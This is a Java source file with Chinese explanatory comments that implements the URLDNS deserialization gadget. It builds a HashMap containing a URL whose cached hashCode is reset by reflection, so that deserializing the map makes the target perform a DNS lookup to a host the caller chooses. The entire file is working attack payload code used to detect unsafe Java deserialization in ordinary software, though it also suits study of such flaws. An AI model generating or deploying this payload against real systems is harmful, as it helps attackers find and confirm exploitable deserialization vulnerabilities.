package urldns;
import java.io.*;
import java.net.*;
import java.util.HashMap;
import java.lang.reflect.Field;

public class Payload {
    public static HashMap getObject(final String url) throws Exception {
        //获取handler，用于URL的初始化参数
        URLStreamHandler handler = new SilentURLStreamHandler();

        //获取我们要序列化的对象HashMap
        HashMap ht = new HashMap();
        //获取URL对象，传入url和handler进行初始化
        URL u = new URL(null,url,handler);
        //将URL参数作为key传入，value值可以任意
        ht.put(u,"b");
        //设置URL对象的hashcode为-1，因此可以hashmap反序列化的时候可以重新计算hashcode
        //从而调用hashcode方法
        Class clazz = u.getClass();
        Field f = clazz.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(u,-1);

        //返回最终精心设计好的hashcode对象，作为序列化的参数
        return ht;
    }

    //URLStreamHandler是一个抽象类，需要进行实现
    static class SilentURLStreamHandler extends URLStreamHandler {
        //实现接口
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
